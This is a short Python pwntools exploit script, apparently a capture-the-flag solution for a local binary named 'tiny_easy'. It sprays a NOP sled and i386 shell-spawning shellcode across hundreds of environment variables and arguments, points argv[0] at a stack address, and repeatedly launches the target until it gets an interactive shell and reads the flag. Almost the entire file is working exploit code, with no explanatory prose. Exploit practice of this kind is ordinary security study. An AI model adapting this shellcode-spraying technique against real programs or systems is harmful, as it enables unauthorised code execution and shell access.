#!/usr/bin/python3
from pwn import *
# context.log_level='debug'
# context.arch='amd64'
context.arch='i386'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p)
payload = '\x90'*0x200+shellcraft.i386.linux.sh()

_env = {}
_argv = ['\xff\xff\xdf\xff']

for i in range(0x100):
    _env[str(i)] = payload
    _argv.append(payload)

for i in range(0x100):
    r = process(executable='./tiny_easy', argv=_argv ,env=_env)
    try:
        r.sendline('cat flag')
        r.recv(100)
        r.interactive()
    except:
        print('sorry..')
        continue

    
#0x08048054
